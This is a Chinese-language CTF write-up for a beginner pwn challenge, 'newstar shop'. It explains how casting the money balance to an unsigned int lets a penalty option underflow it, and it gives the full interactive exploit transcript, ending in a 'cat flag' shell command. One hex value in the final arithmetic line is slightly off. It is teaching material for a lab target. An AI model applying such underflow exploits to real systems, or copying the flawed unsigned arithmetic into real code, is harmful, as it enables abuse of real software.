# W1 newstar shop

## 文件分析

下载`newstar_shop`, 保护全开  
ghidra分析为64位程序

## 解题思路

根据逆向结果，持有的钱会先转换成uint，那么只要使持有的钱下溢，
就可以购买天价终端了

注意：don't choose只能用一次

## EXPLOIT

nc node4.buuoj.cn 28760

以下为输入输出，输入会用**表示

```
 =================
 1.Go to the shop 
 2.Make some money
 3.Don't choose   
 =================
 
 
 **1**
 =============================
 ===Welcome to newstar shop===
 =============================
 1.newstar's gift          20$
 2.pwn write up            40$
 3.shell                 9999$
 
 
 All things are only available for one day!
 What do you want to buy?
 
 
 **2**
 You buy a pwn write up
 That is free after the match,haha
 
 
 =================
 1.Go to the shop 
 2.Make some money
 3.Don't choose   
 =================
 
 
 **1**
 =============================
 ===Welcome to newstar shop===
 =============================
 1.newstar's gift          20$
 2.pwn write up            40$
 3.shell                 9999$
 
 
 All things are only available for one day!
 What do you want to buy?
 
 
 **2**
 You buy a pwn write up
 That is free after the match,haha
 
 
 =================
 1.Go to the shop 
 2.Make some money
 3.Don't choose   
 =================
 
 
 **3**
 You shouldn't choose this
 Please remember, the shop owner doesn't like his secret to be found
 To punish your choice, you will lose 50$ and you will never be able to choose it!
 
 
 =================
 1.Go to the shop 
 2.Make some money
 3.Don't choose   
 =================
 
 
 **1**
 =============================
 ===Welcome to newstar shop===
 =============================
 1.newstar's gift          20$
 2.pwn write up            40$
 3.shell                 9999$
 
 
 All things are only available for one day!
 What do you want to buy?
 
 
 **3**
 How do you buy it?
 
 
 **cat flag**
 flag{你猜}
```

> money变化：100 - 40 - 40 - 50 -> -10 -> 0xFFFFFFF5


Done.
